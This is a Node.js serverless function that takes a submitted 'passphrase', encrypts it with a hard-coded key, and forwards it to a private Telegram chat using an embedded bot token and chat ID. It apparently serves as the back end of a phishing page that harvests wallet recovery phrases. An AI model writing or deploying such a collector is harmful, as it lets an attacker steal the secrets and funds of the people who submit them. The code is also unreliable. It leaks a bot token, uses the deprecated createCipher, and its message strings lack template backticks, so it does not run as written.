const axios = require('axios');
const crypto = require('crypto');

// Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7248582544:AAENmLU6BtzXP__js6HxZuJxuv9oFn4qFcM'; // Replace with your bot token
const YOUR_CHAT_ID = '1779564295'; // Replace with your chat ID
const SECRET_KEY = 'Dontfall'; // Replace with a secure key for encryption

// Encrypt the passphrase
function encryptPassphrase(passphrase) {
    const cipher = crypto.createCipher('aes-256-cbc', SECRET_KEY);
    let encrypted = cipher.update(passphrase, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        const { passphrase } = req.body;

        if (!passphrase) {
            return res.status(400).json({ error: 'Passphrase is required' });
        }

        try {
            // Encrypt the passphrase
            const encryptedPassphrase = encryptPassphrase(passphrase);

            // Send to your Telegram account
            await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
                chat_id: YOUR_CHAT_ID,
                text: Encrypted Passphrase: ${encryptedPassphrase},
            });

            res.status(200).json({ success: true });
        } catch (error) {
            console.error(error);
            res.status(500).json({ error: 'Failed to send passphrase to Telegram' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
};
